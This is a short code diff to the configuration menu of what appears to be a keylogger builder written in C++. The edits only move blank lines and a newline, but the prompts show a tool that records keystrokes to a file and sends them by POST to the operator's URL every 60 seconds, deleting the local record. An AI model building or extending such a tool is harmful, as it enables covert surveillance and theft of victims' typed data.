@@ -17,6 +17,7 @@ void Choice::askChoice()
 	if (getChoice() != 2) {
 		setChoice(1);
 	}
+
 	
 
 }
@@ -48,7 +49,7 @@ void Choice::setConfig()
 		cout << "[+] I hope you know how to show the file dog.\r\n";
 		cout << "[+] Type the name of file : ";
 		cin >> fileName;
-		cout << "\r\n";
+		
 	}
 	else {
 		cout << "[+] Oh nice way to be more anonymous. I hope you have visited the code for know the POST parameter sent by keylogger. \r\n";
@@ -60,9 +61,11 @@ void Choice::setConfig()
 		cout << "[+] Okay but i have to tell you, the record file will be DELETE after each 60 seconds.Before the information will be sent to your URL.\r\n";
 		cout << "[+] Type the name of file : ";
 		cin >> fileName;
-		cout << "\r\n";
+		
 	}
+	cout << "\r\n";
 	setFile(getFile());
+
 
 }
 
